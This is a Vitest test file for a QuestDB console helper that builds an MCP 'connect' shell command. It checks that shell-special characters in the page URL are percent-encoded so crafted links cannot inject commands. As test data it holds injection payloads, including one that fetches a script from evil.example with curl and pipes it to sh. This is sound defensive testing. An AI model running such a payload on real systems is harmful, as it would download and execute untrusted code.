import { describe, expect, it } from "vitest"
import { EXPECTED_MCP_VERSION } from "../../utils/mcp/protocolVersion"
import { connectCommandOf, consoleUrlOf } from "./connectCommand"

const ORIGIN = "https://console.example"
const NPX = `npx @questdb/mcp-server-questdb@${EXPECTED_MCP_VERSION}`

// The characters bash and zsh read specially in a word, each with its URL
// escape: the POSIX shell's blanks, operators, quotes, expansions and
// pattern characters, bash's history and brace expansion, and zsh's
// extended glob.
const SHELL_SPECIAL: Array<[char: string, escape: string]> = [
  [" ", "%20"],
  ["\t", "%09"],
  ["\n", "%0A"],
  ["|", "%7C"],
  ["&", "%26"],
  [";", "%3B"],
  ["<", "%3C"],
  [">", "%3E"],
  ["(", "%28"],
  [")", "%29"],
  ["$", "%24"],
  ["`", "%60"],
  ["\\", "%5C"],
  ['"', "%22"],
  ["'", "%27"],
  ["*", "%2A"],
  ["?", "%3F"],
  ["[", "%5B"],
  ["]", "%5D"],
  ["#", "%23"],
  ["~", "%7E"],
  ["=", "%3D"],
  ["!", "%21"],
  ["{", "%7B"],
  ["}", "%7D"],
  ["^", "%5E"],
]

const commandAt = (pathname: string) =>
  connectCommandOf(consoleUrlOf({ origin: ORIGIN, pathname }), "npx")

describe("the console address in the connect command", () => {
  it.each(SHELL_SPECIAL)(
    "writes %j in the page path as %s, so the shell runs nothing from the link",
    (char, escape) => {
      // Given a link that puts the character between a page and a command
      const pathname = `/c${char}id`

      // When
      const command = commandAt(pathname)

      // Then
      expect(command).toBe(`${NPX} connect ${ORIGIN}/c${escape}id`)
    },
  )

  it.each([
    ["/c;id", "/c%3Bid"],
    ["/$(id)", "/%24%28id%29"],
    [
      "/x;curl$IFS-sL$IFS'evil.example/a'|sh",
      "/x%3Bcurl%24IFS-sL%24IFS%27evil.example/a%27%7Csh",
    ],
  ])(
    "keeps the payload of a crafted link %s inside the address",
    (path, escaped) => {
      // When
      const withAgent = connectCommandOf(
        consoleUrlOf({ origin: ORIGIN, pathname: path }),
        "standalone",
        "codex",
      )

      // Then
      expect(commandAt(path)).toBe(`${NPX} connect ${ORIGIN}${escaped}`)
      expect(withAgent).toBe(
        `node mcp-server-questdb-${EXPECTED_MCP_VERSION}.mjs connect ${ORIGIN}${escaped} --agent codex`,
      )
    },
  )

  it("keeps the page of every ASCII character in one word that no shell expands", () => {
    // Given
    const special = new Set(SHELL_SPECIAL.map(([char]) => char))
    const characters = Array.from({ length: 128 }, (_, code) =>
      String.fromCharCode(code),
    )

    for (const char of characters) {
      // When
      const words = commandAt(`/c${char}id`).split(" ")

      // Then the command is the launcher, `connect` and one printable word
      expect(words.slice(0, 3)).toEqual([...NPX.split(" "), "connect"])
      expect(words).toHaveLength(4)
      expect(words[3]).toMatch(/^[\x21-\x7e]+$/)
      expect([...words[3]].filter((c) => special.has(c))).toEqual([])
    }
  })

  it("leaves an ordinary address as the browser shows it", () => {
    // When
    const atRoot = consoleUrlOf({
      origin: "http://localhost:9000",
      pathname: "/",
    })
    const underPath = consoleUrlOf({
      origin: ORIGIN,
      pathname: "/questdb-2_0/web.console/index.html",
    })
    // An escape the browser already made keeps its %.
    const escaped = consoleUrlOf({ origin: ORIGIN, pathname: "/my%20console/" })

    // Then
    expect(atRoot).toBe("http://localhost:9000")
    expect(underPath).toBe(`${ORIGIN}/questdb-2_0/web.console`)
    expect(escaped).toBe(`${ORIGIN}/my%20console`)
  })

  it("writes a character outside ASCII as the escapes of its UTF-8 bytes", () => {
    // When
    const accented = consoleUrlOf({ origin: ORIGIN, pathname: "/café" })
    const emoji = consoleUrlOf({ origin: ORIGIN, pathname: "/a😀b" })

    // Then
    expect(accented).toBe(`${ORIGIN}/caf%C3%A9`)
    expect(emoji).toBe(`${ORIGIN}/a%F0%9F%98%80b`)
  })
})
